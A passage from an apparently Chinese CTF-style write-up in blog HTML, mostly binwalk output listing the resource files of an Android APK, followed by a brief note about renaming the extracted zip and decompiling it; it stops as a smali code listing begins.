res/drawable-hdpi/abc_spinner_ab_focused_holo_dark.9.png</span><br><span class=\"line\">155109        0x25DE5         Zip archive data, at least v1.0 to extract, compressed size: 513, uncompressed size: 513, name: res/drawable-hdpi/abc_spinner_ab_focused_holo_light.9.png</span><br><span class=\"line\">155709        0x2603D         Zip archive data, at least v1.0 to extract, compressed size: 456, uncompressed size: 456, name: res/drawable-hdpi/abc_spinner_ab_pressed_holo_dark.9.png</span><br><span class=\"line\">156251        0x2625B         Zip archive data, at least v1.0 to extract, compressed size: 452, uncompressed size: 452, name: res/drawable-hdpi/abc_spinner_ab_pressed_holo_light.9.png</span><br><span class=\"line\">156790        0x26476         Zip archive data, at least v1.0 to extract, compressed size: 156, uncompressed size: 156, name: res/drawable-hdpi/abc_tab_selected_focused_holo.9.png</span><br><span class=\"line\">157029        0x26565         Zip archive data, at least v1.0 to extract, compressed size: 149, uncompressed size: 149, name: res/drawable-hdpi/abc_tab_selected_holo.9.png</span><br><span class=\"line\">157253        0x26645         Zip archive data, at least v1.0 to extract, compressed size: 155, uncompressed size: 155, name: res/drawable-hdpi/abc_tab_selected_pressed_holo.9.png</span><br><span class=\"line\">157491        0x26733         Zip archive data, at least v1.0 to extract, compressed size: 153, uncompressed size: 153, name: res/drawable-hdpi/abc_tab_unselected_pressed_holo.9.png</span><br><span class=\"line\">157729        0x26821         Zip archive data, at least v1.0 to extract, compressed size: 173, uncompressed size: 173, name: res/drawable-hdpi/abc_textfield_search_default_holo_dark.9.png</span><br><span class=\"line\">157994        0x2692A         Zip archive data, at least v1.0 to extract, compressed size: 170, uncompressed size: 170, name: res/drawable-hdpi/abc_textfield_search_default_holo_light.9.png</span><br><span class=\"line\">158257        0x26A31         Zip archive data, at least v1.0 to extract, compressed size: 176, uncompressed size: 176, name: res/drawable-hdpi/abc_textfield_search_right_default_holo_dark.9.png</span><br><span class=\"line\">158531        0x26B43         Zip archive data, at least v1.0 to extract, compressed size: 168, uncompressed size: 168, name: res/drawable-hdpi/abc_textfield_search_right_default_holo_light.9.png</span><br><span class=\"line\">158798        0x26C4E         Zip archive data, at least v1.0 to extract, compressed size: 181, uncompressed size: 181, name: res/drawable-hdpi/abc_textfield_search_right_selected_holo_dark.9.png</span><br><span class=\"line\">159078        0x26D66         Zip archive data, at least v1.0 to extract, compressed size: 181, uncompressed size: 181, name: res/drawable-hdpi/abc_textfield_search_right_selected_holo_light.9.png</span><br><span class=\"line\">159359        0x26E7F         Zip archive data, at least v1.0 to extract, compressed size: 187, uncompressed size: 187, name: res/drawable-hdpi/abc_textfield_search_selected_holo_dark.9.png</span><br><span class=\"line\">159639        0x26F97         Zip archive data, at least v1.0 to extract, compressed size: 187, uncompressed size: 187, name: res/drawable-hdpi/abc_textfield_search_selected_holo_light.9.png</span><br><span class=\"line\">159920        0x270B0         Zip archive data, at least v1.0 to extract, compressed size: 5964, uncompressed size: 5964, name: res/drawable-hdpi/ic_launcher.png</span><br><span class=\"line\">165947        0x2883B         Zip archive data, at least v1.0 to extract, compressed size: 199, uncompressed size: 199, name: res/drawable-mdpi/abc_ab_bottom_solid_dark_holo.9.png</span><br><span class=\"line\">166229        0x28955         Zip archive data, at least v1.0 to extract, compressed size: 199, uncompressed size: 199, name: res/drawable-mdpi/abc_ab_bottom_solid_light_holo.9.png</span><br><span class=\"line\">166512        0x28A70         Zip archive data, at least v1.0 to extract, compressed size: 209, uncompressed size: 209, name: res/drawable-mdpi/abc_ab_bottom_transparent_dark_holo.9.png</span><br><span class=\"line\">166810        0x28B9A         Zip archive data, at least v1.0 to extract, compressed size: 209, uncompressed size: 209, name: res/drawable-mdpi/abc_ab_bottom_transparent_light_holo.9.png</span><br><span class=\"line\">167109        0x28CC5         Zip archive data, at least v1.0 to extract, compressed size: 247, uncompressed size: 247, name: res/drawable-mdpi/abc_ab_share_pack_holo_dark.9.png</span><br><span class=\"line\">167437        0x28E0D         Zip archive data, at least v1.0 to extract, compressed size: 248, uncompressed size: 248, name: res/drawable-mdpi/abc_ab_share_pack_holo_light.9.png</span><br><span class=\"line\">167767        0x28F57         Zip archive data, at least v1.0 to extract, compressed size: 206, uncompressed size: 206, name: res/drawable-mdpi/abc_ab_solid_dark_holo.9.png</span><br><span class=\"line\">168049        0x29071         Zip archive data, at least v1.0 to extract, compressed size: 206, uncompressed size: 206, name: res/drawable-mdpi/abc_ab_solid_light_holo.9.png</span><br><span class=\"line\">168332        0x2918C         Zip archive data, at least v1.0 to extract, compressed size: 206, uncompressed size: 206, name: res/drawable-mdpi/abc_ab_stacked_solid_dark_holo.9.png</span><br><span class=\"line\">168622        0x292AE         Zip archive data, at least v1.0 to extract, compressed size: 206, uncompressed size: 206, name: res/drawable-mdpi/abc_ab_stacked_solid_light_holo.9.png</span><br><span class=\"line\">168913        0x293D1         Zip archive data, at least v1.0 to extract, compressed size: 199, uncompressed size: 199, name: res/drawable-mdpi/abc_ab_stacked_transparent_dark_holo.9.png</span><br><span class=\"line\">169202        0x294F2         Zip archive data, at least v1.0 to extract, compressed size: 198, uncompressed size: 198, name: res/drawable-mdpi/abc_ab_stacked_transparent_light_holo.9.png</span><br><span class=\"line\">169491        0x29613         Zip archive data, at least v1.0 to extract, compressed size: 224, uncompressed size: 224, name: res/drawable-mdpi/abc_ab_transparent_dark_holo.9.png</span><br><span class=\"line\">169797        0x29745         Zip archive data, at least v1.0 to extract, compressed size: 221, uncompressed size: 221, name: res/drawable-mdpi/abc_ab_transparent_light_holo.9.png</span><br><span class=\"line\">170101        0x29875         Zip archive data, at least v1.0 to extract, compressed size: 199, uncompressed size: 199, name: res/drawable-mdpi/abc_cab_background_bottom_holo_dark.9.png</span><br><span class=\"line\">170389        0x29995         Zip archive data, at least v1.0 to extract, compressed size: 199, uncompressed size: 199, name: res/drawable-mdpi/abc_cab_background_bottom_holo_light.9.png</span><br><span class=\"line\">170678        0x29AB6         Zip archive data, at least v1.0 to extract, compressed size: 199, uncompressed size: 199, name: res/drawable-mdpi/abc_cab_background_top_holo_dark.9.png</span><br><span class=\"line\">170963        0x29BD3         Zip archive data, at least v1.0 to extract, compressed size: 199, uncompressed size: 199, name: res/drawable-mdpi/abc_cab_background_top_holo_light.9.png</span><br><span class=\"line\">171249        0x29CF1         Zip archive data, at least v1.0 to extract, compressed size: 384, uncompressed size: 384, name: res/drawable-mdpi/abc_ic_ab_back_holo_dark.png</span><br><span class=\"line\">171709        0x29EBD         Zip archive data, at least v1.0 to extract, compressed size: 312, uncompressed size: 312, name: res/drawable-mdpi/abc_ic_ab_back_holo_light.png</span><br><span class=\"line\">172098        0x2A042         Zip archive data, at least v1.0 to extract, compressed size: 554, uncompressed size: 554, name: res/drawable-mdpi/abc_ic_cab_done_holo_dark.png</span><br><span class=\"line\">172729        0x2A2B9         Zip archive data, at least v1.0 to extract, compressed size: 462, uncompressed size: 462, name: res/drawable-mdpi/abc_ic_cab_done_holo_light.png</span><br><span class=\"line\">173269        0x2A4D5         Zip archive data, at least v1.0 to extract, compressed size: 1505, uncompressed size: 1505, name: res/drawable-mdpi/abc_ic_clear_disabled.png</span><br><span class=\"line\">174847        0x2AAFF         Zip archive data, at least v1.0 to extract, compressed size: 1024, uncompressed size: 1024, name: res/drawable-mdpi/abc_ic_clear_normal.png</span><br><span class=\"line\">175942        0x2AF46         Zip archive data, at least v1.0 to extract, compressed size: 740, uncompressed size: 740, name: res/drawable-mdpi/abc_ic_clear_search_api_disabled_holo_light.png</span><br><span class=\"line\">176777        0x2B289         Zip archive data, at least v1.0 to extract, compressed size: 552, uncompressed size: 552, name: res/drawable-mdpi/abc_ic_clear_search_api_holo_light.png</span><br><span class=\"line\">177415        0x2B507         Zip archive data, at least v1.0 to extract, compressed size: 450, uncompressed size: 450, name: res/drawable-mdpi/abc_ic_commit_search_api_holo_dark.png</span><br><span class=\"line\">177951        0x2B71F         Zip archive data, at least v1.0 to extract, compressed size: 440, uncompressed size: 440, name: res/drawable-mdpi/abc_ic_commit_search_api_holo_light.png</span><br><span class=\"line\">178478        0x2B92E         Zip archive data, at least v1.0 to extract, compressed size: 1020, uncompressed size: 1020, name: res/drawable-mdpi/abc_ic_go.png</span><br><span class=\"line\">179559        0x2BD67         Zip archive data, at least v1.0 to extract, compressed size: 575, uncompressed size: 575, name: res/drawable-mdpi/abc_ic_go_search_api_holo_light.png</span><br><span class=\"line\">180217        0x2BFF9         Zip archive data, at least v1.0 to extract, compressed size: 113, uncompressed size: 113, name: res/drawable-mdpi/abc_ic_menu_moreoverflow_normal_holo_dark.png</span><br><span class=\"line\">180423        0x2C0C7         Zip archive data, at least v1.0 to extract, compressed size: 123, uncompressed size: 123, name: res/drawable-mdpi/abc_ic_menu_moreoverflow_normal_holo_light.png</span><br><span class=\"line\">180640        0x2C1A0         Zip archive data, at least v1.0 to extract, compressed size: 464, uncompressed size: 464, name: res/drawable-mdpi/abc_ic_menu_share_holo_dark.png</span><br><span class=\"line\">181183        0x2C3BF         Zip archive data, at least v1.0 to extract, compressed size: 479, uncompressed size: 479, name: res/drawable-mdpi/abc_ic_menu_share_holo_light.png</span><br><span class=\"line\">181742        0x2C5EE         Zip archive data, at least v1.0 to extract, compressed size: 1287, uncompressed size: 1287, name: res/drawable-mdpi/abc_ic_search.png</span><br><span class=\"line\">183094        0x2CB36         Zip archive data, at least v1.0 to extract, compressed size: 1379, uncompressed size: 1379, name: res/drawable-mdpi/abc_ic_search_api_holo_light.png</span><br><span class=\"line\">184553        0x2D0E9         Zip archive data, at least v1.0 to extract, compressed size: 942, uncompressed size: 942, name: res/drawable-mdpi/abc_ic_voice_search.png</span><br><span class=\"line\">185566        0x2D4DE         Zip archive data, at least v1.0 to extract, compressed size: 604, uncompressed size: 604, name: res/drawable-mdpi/abc_ic_voice_search_api_holo_light.png</span><br><span class=\"line\">186256        0x2D790         Zip archive data, at least v1.0 to extract, compressed size: 132, uncompressed size: 132, name: res/drawable-mdpi/abc_list_divider_holo_dark.9.png</span><br><span class=\"line\">186468        0x2D864         Zip archive data, at least v1.0 to extract, compressed size: 132, uncompressed size: 132, name: res/drawable-mdpi/abc_list_divider_holo_light.9.png</span><br><span class=\"line\">186681        0x2D939         Zip archive data, at least v1.0 to extract, compressed size: 186, uncompressed size: 186, name: res/drawable-mdpi/abc_list_focused_holo.9.png</span><br><span class=\"line\">186942        0x2DA3E         Zip archive data, at least v1.0 to extract, compressed size: 175, uncompressed size: 175, name: res/drawable-mdpi/abc_list_longpressed_holo.9.png</span><br><span class=\"line\">187196        0x2DB3C         Zip archive data, at least v1.0 to extract, compressed size: 175, uncompressed size: 175, name: res/drawable-mdpi/abc_list_pressed_holo_dark.9.png</span><br><span class=\"line\">187451        0x2DC3B         Zip archive data, at least v1.0 to extract, compressed size: 175, uncompressed size: 175, name: res/drawable-mdpi/abc_list_pressed_holo_light.9.png</span><br><span class=\"line\">187707        0x2DD3B         Zip archive data, at least v1.0 to extract, compressed size: 190, uncompressed size: 190, name: res/drawable-mdpi/abc_list_selector_disabled_holo_dark.9.png</span><br><span class=\"line\">187987        0x2DE53         Zip archive data, at least v1.0 to extract, compressed size: 191, uncompressed size: 191, name: res/drawable-mdpi/abc_list_selector_disabled_holo_light.9.png</span><br><span class=\"line\">188269        0x2DF6D         Zip archive data, at least v1.0 to extract, compressed size: 816, uncompressed size: 816, name: res/drawable-mdpi/abc_menu_dropdown_panel_holo_dark.9.png</span><br><span class=\"line\">189172        0x2E2F4         Zip archive data, at least v1.0 to extract, compressed size: 820, uncompressed size: 820, name: res/drawable-mdpi/abc_menu_dropdown_panel_holo_light.9.png</span><br><span class=\"line\">190080        0x2E680         Zip archive data, at least v1.0 to extract, compressed size: 570, uncompressed size: 570, name: res/drawable-mdpi/abc_menu_hardkey_panel_holo_dark.9.png</span><br><span class=\"line\">190736        0x2E910         Zip archive data, at least v1.0 to extract, compressed size: 569, uncompressed size: 569, name: res/drawable-mdpi/abc_menu_hardkey_panel_holo_light.9.png</span><br><span class=\"line\">191392        0x2EBA0         Zip archive data, at least v1.0 to extract, compressed size: 291, uncompressed size: 291, name: res/drawable-mdpi/abc_spinner_ab_default_holo_dark.9.png</span><br><span class=\"line\">191769        0x2ED19         Zip archive data, at least v1.0 to extract, compressed size: 292, uncompressed size: 292, name: res/drawable-mdpi/abc_spinner_ab_default_holo_light.9.png</span><br><span class=\"line\">192148        0x2EE94         Zip archive data, at least v1.0 to extract, compressed size: 291, uncompressed size: 291, name: res/drawable-mdpi/abc_spinner_ab_disabled_holo_dark.9.png</span><br><span class=\"line\">192526        0x2F00E         Zip archive data, at least v1.0 to extract, compressed size: 291, uncompressed size: 291, name: res/drawable-mdpi/abc_spinner_ab_disabled_holo_light.9.png</span><br><span class=\"line\">192905        0x2F189         Zip archive data, at least v1.0 to extract, compressed size: 426, uncompressed size: 426, name: res/drawable-mdpi/abc_spinner_ab_focused_holo_dark.9.png</span><br><span class=\"line\">193417        0x2F389         Zip archive data, at least v1.0 to extract, compressed size: 424, uncompressed size: 424, name: res/drawable-mdpi/abc_spinner_ab_focused_holo_light.9.png</span><br><span class=\"line\">193928        0x2F588         Zip archive data, at least v1.0 to extract, compressed size: 373, uncompressed size: 373, name: res/drawable-mdpi/abc_spinner_ab_pressed_holo_dark.9.png</span><br><span class=\"line\">194387        0x2F753         Zip archive data, at least v1.0 to extract, compressed size: 370, uncompressed size: 370, name: res/drawable-mdpi/abc_spinner_ab_pressed_holo_light.9.png</span><br><span class=\"line\">194844        0x2F91C         Zip archive data, at least v1.0 to extract, compressed size: 155, uncompressed size: 155, name: res/drawable-mdpi/abc_tab_selected_focused_holo.9.png</span><br><span class=\"line\">195082        0x2FA0A         Zip archive data, at least v1.0 to extract, compressed size: 151, uncompressed size: 151, name: res/drawable-mdpi/abc_tab_selected_holo.9.png</span><br><span class=\"line\">195308        0x2FAEC         Zip archive data, at least v1.0 to extract, compressed size: 155, uncompressed size: 155, name: res/drawable-mdpi/abc_tab_selected_pressed_holo.9.png</span><br><span class=\"line\">195546        0x2FBDA         Zip archive data, at least v1.0 to extract, compressed size: 157, uncompressed size: 157, name: res/drawable-mdpi/abc_tab_unselected_pressed_holo.9.png</span><br><span class=\"line\">195788        0x2FCCC         Zip archive data, at least v1.0 to extract, compressed size: 176, uncompressed size: 176, name: res/drawable-mdpi/abc_textfield_search_default_holo_dark.9.png</span><br><span class=\"line\">196056        0x2FDD8         Zip archive data, at least v1.0 to extract, compressed size: 166, uncompressed size: 166, name: res/drawable-mdpi/abc_textfield_search_default_holo_light.9.png</span><br><span class=\"line\">196315        0x2FEDB         Zip archive data, at least v1.0 to extract, compressed size: 174, uncompressed size: 174, name: res/drawable-mdpi/abc_textfield_search_right_default_holo_dark.9.png</span><br><span class=\"line\">196587        0x2FFEB         Zip archive data, at least v1.0 to extract, compressed size: 167, uncompressed size: 167, name: res/drawable-mdpi/abc_textfield_search_right_default_holo_light.9.png</span><br><span class=\"line\">196853        0x300F5         Zip archive data, at least v1.0 to extract, compressed size: 175, uncompressed size: 175, name: res/drawable-mdpi/abc_textfield_search_right_selected_holo_dark.9.png</span><br><span class=\"line\">197127        0x30207         Zip archive data, at least v1.0 to extract, compressed size: 175, uncompressed size: 175, name: res/drawable-mdpi/abc_textfield_search_right_selected_holo_light.9.png</span><br><span class=\"line\">197402        0x3031A         Zip archive data, at least v1.0 to extract, compressed size: 182, uncompressed size: 182, name: res/drawable-mdpi/abc_textfield_search_selected_holo_dark.9.png</span><br><span class=\"line\">197677        0x3042D         Zip archive data, at least v1.0 to extract, compressed size: 182, uncompressed size: 182, name: res/drawable-mdpi/abc_textfield_search_selected_holo_light.9.png</span><br><span class=\"line\">197953        0x30541         Zip archive data, at least v1.0 to extract, compressed size: 3112, uncompressed size: 3112, name: res/drawable-mdpi/ic_launcher.png</span><br><span class=\"line\">201128        0x311A8         Zip archive data, at least v1.0 to extract, compressed size: 227, uncompressed size: 227, name: res/drawable-xhdpi/abc_ab_bottom_solid_dark_holo.9.png</span><br><span class=\"line\">201439        0x312DF         Zip archive data, at least v1.0 to extract, compressed size: 227, uncompressed size: 227, name: res/drawable-xhdpi/abc_ab_bottom_solid_light_holo.9.png</span><br><span class=\"line\">201751        0x31417         Zip archive data, at least v1.0 to extract, compressed size: 237, uncompressed size: 237, name: res/drawable-xhdpi/abc_ab_bottom_transparent_dark_holo.9.png</span><br><span class=\"line\">202078        0x3155E         Zip archive data, at least v1.0 to extract, compressed size: 236, uncompressed size: 236, name: res/drawable-xhdpi/abc_ab_bottom_transparent_light_holo.9.png</span><br><span class=\"line\">202405        0x316A5         Zip archive data, at least v1.0 to extract, compressed size: 271, uncompressed size: 271, name: res/drawable-xhdpi/abc_ab_share_pack_holo_dark.9.png</span><br><span class=\"line\">202758        0x31806         Zip archive data, at least v1.0 to extract, compressed size: 267, uncompressed size: 267, name: res/drawable-xhdpi/abc_ab_share_pack_holo_light.9.png</span><br><span class=\"line\">203108        0x31964         Zip archive data, at least v1.0 to extract, compressed size: 236, uncompressed size: 236, name: res/drawable-xhdpi/abc_ab_solid_dark_holo.9.png</span><br><span class=\"line\">203421        0x31A9D         Zip archive data, at least v1.0 to extract, compressed size: 236, uncompressed size: 236, name: res/drawable-xhdpi/abc_ab_solid_light_holo.9.png</span><br><span class=\"line\">203735        0x31BD7         Zip archive data, at least v1.0 to extract, compressed size: 236, uncompressed size: 236, name: res/drawable-xhdpi/abc_ab_stacked_solid_dark_holo.9.png</span><br><span class=\"line\">204056        0x31D18         Zip archive data, at least v1.0 to extract, compressed size: 236, uncompressed size: 236, name: res/drawable-xhdpi/abc_ab_stacked_solid_light_holo.9.png</span><br><span class=\"line\">204378        0x31E5A         Zip archive data, at least v1.0 to extract, compressed size: 228, uncompressed size: 228, name: res/drawable-xhdpi/abc_ab_stacked_transparent_dark_holo.9.png</span><br><span class=\"line\">204697        0x31F99         Zip archive data, at least v1.0 to extract, compressed size: 227, uncompressed size: 227, name: res/drawable-xhdpi/abc_ab_stacked_transparent_light_holo.9.png</span><br><span class=\"line\">205016        0x320D8         Zip archive data, at least v1.0 to extract, compressed size: 255, uncompressed size: 255, name: res/drawable-xhdpi/abc_ab_transparent_dark_holo.9.png</span><br><span class=\"line\">205354        0x3222A         Zip archive data, at least v1.0 to extract, compressed size: 252, uncompressed size: 252, name: res/drawable-xhdpi/abc_ab_transparent_light_holo.9.png</span><br><span class=\"line\">205690        0x3237A         Zip archive data, at least v1.0 to extract, compressed size: 231, uncompressed size: 231, name: res/drawable-xhdpi/abc_cab_background_bottom_holo_dark.9.png</span><br><span class=\"line\">206011        0x324BB         Zip archive data, at least v1.0 to extract, compressed size: 229, uncompressed size: 229, name: res/drawable-xhdpi/abc_cab_background_bottom_holo_light.9.png</span><br><span class=\"line\">206331        0x325FB         Zip archive data, at least v1.0 to extract, compressed size: 231, uncompressed size: 231, name: res/drawable-xhdpi/abc_cab_background_top_holo_dark.9.png</span><br><span class=\"line\">206649        0x32739         Zip archive data, at least v1.0 to extract, compressed size: 228, uncompressed size: 228, name: res/drawable-xhdpi/abc_cab_background_top_holo_light.9.png</span><br><span class=\"line\">206965        0x32875         Zip archive data, at least v1.0 to extract, compressed size: 626, uncompressed size: 626, name: res/drawable-xhdpi/abc_ic_ab_back_holo_dark.png</span><br><span class=\"line\">207668        0x32B34         Zip archive data, at least v1.0 to extract, compressed size: 527, uncompressed size: 527, name: res/drawable-xhdpi/abc_ic_ab_back_holo_light.png</span><br><span class=\"line\">208273        0x32D91         Zip archive data, at least v1.0 to extract, compressed size: 1049, uncompressed size: 1049, name: res/drawable-xhdpi/abc_ic_cab_done_holo_dark.png</span><br><span class=\"line\">209400        0x331F8         Zip archive data, at least v1.0 to extract, compressed size: 782, uncompressed size: 782, name: res/drawable-xhdpi/abc_ic_cab_done_holo_light.png</span><br><span class=\"line\">210261        0x33555         Zip archive data, at least v1.0 to extract, compressed size: 1525, uncompressed size: 1525, name: res/drawable-xhdpi/abc_ic_clear_disabled.png</span><br><span class=\"line\">211860        0x33B94         Zip archive data, at least v1.0 to extract, compressed size: 1219, uncompressed size: 1219, name: res/drawable-xhdpi/abc_ic_clear_search_api_disabled_holo_light.png</span><br><span class=\"line\">213175        0x340B7         Zip archive data, at least v1.0 to extract, compressed size: 1532, uncompressed size: 1532, name: res/drawable-xhdpi/abc_ic_clear_search_api_holo_light.png</span><br><span class=\"line\">214794        0x3470A         Zip archive data, at least v1.0 to extract, compressed size: 666, uncompressed size: 666, name: res/drawable-xhdpi/abc_ic_commit_search_api_holo_dark.png</span><br><span class=\"line\">215547        0x349FB         Zip archive data, at least v1.0 to extract, compressed size: 597, uncompressed size: 597, name: res/drawable-xhdpi/abc_ic_commit_search_api_holo_light.png</span><br><span class=\"line\">216232        0x34CA8         Zip archive data, at least v1.0 to extract, compressed size: 1739, uncompressed size: 1739, name: res/drawable-xhdpi/abc_ic_go.png</span><br><span class=\"line\">218033        0x353B1         Zip archive data, at least v1.0 to extract, compressed size: 840, uncompressed size: 840, name: res/drawable-xhdpi/abc_ic_go_search_api_holo_light.png</span><br><span class=\"line\">218957        0x3574D         Zip archive data, at least v1.0 to extract, compressed size: 132, uncompressed size: 132, name: res/drawable-xhdpi/abc_ic_menu_moreoverflow_normal_holo_dark.png</span><br><span class=\"line\">219183        0x3582F         Zip archive data, at least v1.0 to extract, compressed size: 148, uncompressed size: 148, name: res/drawable-xhdpi/abc_ic_menu_moreoverflow_normal_holo_light.png</span><br><span class=\"line\">219426        0x35922         Zip archive data, at least v1.0 to extract, compressed size: 833, uncompressed size: 833, name: res/drawable-xhdpi/abc_ic_menu_share_holo_dark.png</span><br><span class=\"line\">220339        0x35CB3         Zip archive data, at least v1.0 to extract, compressed size: 869, uncompressed size: 869, name: res/drawable-xhdpi/abc_ic_menu_share_holo_light.png</span><br><span class=\"line\">221289        0x36069         Zip archive data, at least v1.0 to extract, compressed size: 2783, uncompressed size: 2783, name: res/drawable-xhdpi/abc_ic_search.png</span><br><span class=\"line\">224138        0x36B8A         Zip archive data, at least v1.0 to extract, compressed size: 2761, uncompressed size: 2761, name: res/drawable-xhdpi/abc_ic_search_api_holo_light.png</span><br><span class=\"line\">226980        0x376A4         Zip archive data, at least v1.0 to extract, compressed size: 2039, uncompressed size: 2039, name: res/drawable-xhdpi/abc_ic_voice_search.png</span><br><span class=\"line\">229091        0x37EE3         Zip archive data, at least v1.0 to extract, compressed size: 1215, uncompressed size: 1215, name: res/drawable-xhdpi/abc_ic_voice_search_api_holo_light.png</span><br><span class=\"line\">230393        0x383F9         Zip archive data, at least v1.0 to extract, compressed size: 139, uncompressed size: 139, name: res/drawable-xhdpi/abc_list_divider_holo_dark.9.png</span><br><span class=\"line\">230613        0x384D5         Zip archive data, at least v1.0 to extract, compressed size: 139, uncompressed size: 139, name: res/drawable-xhdpi/abc_list_divider_holo_light.9.png</span><br><span class=\"line\">230834        0x385B2         Zip archive data, at least v1.0 to extract, compressed size: 208, uncompressed size: 208, name: res/drawable-xhdpi/abc_list_focused_holo.9.png</span><br><span class=\"line\">231118        0x386CE         Zip archive data, at least v1.0 to extract, compressed size: 178, uncompressed size: 178, name: res/drawable-xhdpi/abc_list_longpressed_holo.9.png</span><br><span class=\"line\">231376        0x387D0         Zip archive data, at least v1.0 to extract, compressed size: 178, uncompressed size: 178, name: res/drawable-xhdpi/abc_list_pressed_holo_dark.9.png</span><br><span class=\"line\">231635        0x388D3         Zip archive data, at least v1.0 to extract, compressed size: 178, uncompressed size: 178, name: res/drawable-xhdpi/abc_list_pressed_holo_light.9.png</span><br><span class=\"line\">231895        0x389D7         Zip archive data, at least v1.0 to extract, compressed size: 218, uncompressed size: 218, name: res/drawable-xhdpi/abc_list_selector_disabled_holo_dark.9.png</span><br><span class=\"line\">232204        0x38B0C         Zip archive data, at least v1.0 to extract, compressed size: 217, uncompressed size: 217, name: res/drawable-xhdpi/abc_list_selector_disabled_holo_light.9.png</span><br><span class=\"line\">232513        0x38C41         Zip archive data, at least v1.0 to extract, compressed size: 1749, uncompressed size: 1749, name: res/drawable-xhdpi/abc_menu_dropdown_panel_holo_dark.9.png</span><br><span class=\"line\">234350        0x3936E         Zip archive data, at least v1.0 to extract, compressed size: 1774, uncompressed size: 1774, name: res/drawable-xhdpi/abc_menu_dropdown_panel_holo_light.9.png</span><br><span class=\"line\">236213        0x39AB5         Zip archive data, at least v1.0 to extract, compressed size: 1153, uncompressed size: 1153, name: res/drawable-xhdpi/abc_menu_hardkey_panel_holo_dark.9.png</span><br><span class=\"line\">237453        0x39F8D         Zip archive data, at least v1.0 to extract, compressed size: 1118, uncompressed size: 1118, name: res/drawable-xhdpi/abc_menu_hardkey_panel_holo_light.9.png</span><br><span class=\"line\">238659        0x3A443         Zip archive data, at least v1.0 to extract, compressed size: 377, uncompressed size: 377, name: res/drawable-xhdpi/abc_spinner_ab_default_holo_dark.9.png</span><br><span class=\"line\">239123        0x3A613         Zip archive data, at least v1.0 to extract, compressed size: 376, uncompressed size: 376, name: res/drawable-xhdpi/abc_spinner_ab_default_holo_light.9.png</span><br><span class=\"line\">239587        0x3A7E3         Zip archive data, at least v1.0 to extract, compressed size: 365, uncompressed size: 365, name: res/drawable-xhdpi/abc_spinner_ab_disabled_holo_dark.9.png</span><br><span class=\"line\">240040        0x3A9A8         Zip archive data, at least v1.0 to extract, compressed size: 365, uncompressed size: 365, name: res/drawable-xhdpi/abc_spinner_ab_disabled_holo_light.9.png</span><br><span class=\"line\">240494        0x3AB6E         Zip archive data, at least v1.0 to extract, compressed size: 614, uncompressed size: 614, name: res/drawable-xhdpi/abc_spinner_ab_focused_holo_dark.9.png</span><br><span class=\"line\">241195        0x3AE2B         Zip archive data, at least v1.0 to extract, compressed size: 608, uncompressed size: 608, name: res/drawable-xhdpi/abc_spinner_ab_focused_holo_light.9.png</span><br><span class=\"line\">241891        0x3B0E3         Zip archive data, at least v1.0 to extract, compressed size: 544, uncompressed size: 544, name: res/drawable-xhdpi/abc_spinner_ab_pressed_holo_dark.9.png</span><br><span class=\"line\">242522        0x3B35A         Zip archive data, at least v1.0 to extract, compressed size: 542, uncompressed size: 542, name: res/drawable-xhdpi/abc_spinner_ab_pressed_holo_light.9.png</span><br><span class=\"line\">243152        0x3B5D0         Zip archive data, at least v1.0 to extract, compressed size: 157, uncompressed size: 157, name: res/drawable-xhdpi/abc_tab_selected_focused_holo.9.png</span><br><span class=\"line\">243393        0x3B6C1         Zip archive data, at least v1.0 to extract, compressed size: 150, uncompressed size: 150, name: res/drawable-xhdpi/abc_tab_selected_holo.9.png</span><br><span class=\"line\">243619        0x3B7A3         Zip archive data, at least v1.0 to extract, compressed size: 156, uncompressed size: 156, name: res/drawable-xhdpi/abc_tab_selected_pressed_holo.9.png</span><br><span class=\"line\">243859        0x3B893         Zip archive data, at least v1.0 to extract, compressed size: 157, uncompressed size: 157, name: res/drawable-xhdpi/abc_tab_unselected_pressed_holo.9.png</span><br><span class=\"line\">244102        0x3B986         Zip archive data, at least v1.0 to extract, compressed size: 196, uncompressed size: 196, name: res/drawable-xhdpi/abc_textfield_search_default_holo_dark.9.png</span><br><span class=\"line\">244391        0x3BAA7         Zip archive data, at least v1.0 to extract, compressed size: 198, uncompressed size: 198, name: res/drawable-xhdpi/abc_textfield_search_default_holo_light.9.png</span><br><span class=\"line\">244683        0x3BBCB         Zip archive data, at least v1.0 to extract, compressed size: 188, uncompressed size: 188, name: res/drawable-xhdpi/abc_textfield_search_right_default_holo_dark.9.png</span><br><span class=\"line\">244970        0x3BCEA         Zip archive data, at least v1.0 to extract, compressed size: 192, uncompressed size: 192, name: res/drawable-xhdpi/abc_textfield_search_right_default_holo_light.9.png</span><br><span class=\"line\">245262        0x3BE0E         Zip archive data, at least v1.0 to extract, compressed size: 191, uncompressed size: 191, name: res/drawable-xhdpi/abc_textfield_search_right_selected_holo_dark.9.png</span><br><span class=\"line\">245553        0x3BF31         Zip archive data, at least v1.0 to extract, compressed size: 191, uncompressed size: 191, name: res/drawable-xhdpi/abc_textfield_search_right_selected_holo_light.9.png</span><br><span class=\"line\">245845        0x3C055         Zip archive data, at least v1.0 to extract, compressed size: 182, uncompressed size: 182, name: res/drawable-xhdpi/abc_textfield_search_selected_holo_dark.9.png</span><br><span class=\"line\">246121        0x3C169         Zip archive data, at least v1.0 to extract, compressed size: 199, uncompressed size: 199, name: res/drawable-xhdpi/abc_textfield_search_selected_holo_light.9.png</span><br><span class=\"line\">246415        0x3C28F         Zip archive data, at least v1.0 to extract, compressed size: 9355, uncompressed size: 9355, name: res/drawable-xhdpi/ic_launcher.png</span><br><span class=\"line\">255834        0x3E75A         Zip archive data, at least v1.0 to extract, compressed size: 17889, uncompressed size: 17889, name: res/drawable-xxhdpi/ic_launcher.png</span><br><span class=\"line\">273788        0x42D7C         Zip archive data, at least v2.0 to extract, name: classes.dex</span><br><span class=\"line\">657531        0xA087B         Zip archive data, at least v2.0 to extract, name: META-INF/MANIFEST.MF</span><br><span class=\"line\">665333        0xA26F5         Zip archive data, at least v2.0 to extract, name: META-INF/CERT.SF</span><br><span class=\"line\">673349        0xA4645         Zip archive data, at least v2.0 to extract, name: META-INF/CERT.RSA</span><br><span class=\"line\">700859        0xAB1BB         End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure>\n<p>主要是得到了一个zip文件：<br>![](/images/Writeup/20210914105036.png]<br>看了一下zip文件，怀疑是apk包，改后缀名拖去安卓解包看一下：<br>![](/images/Writeup/20210914105124.png]<br>![](/images/Writeup/20210914105131.png]<br>看一下核心代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">.line <span class=\"number\">32</span></span><br><span class=\"line\">.local v6, <span 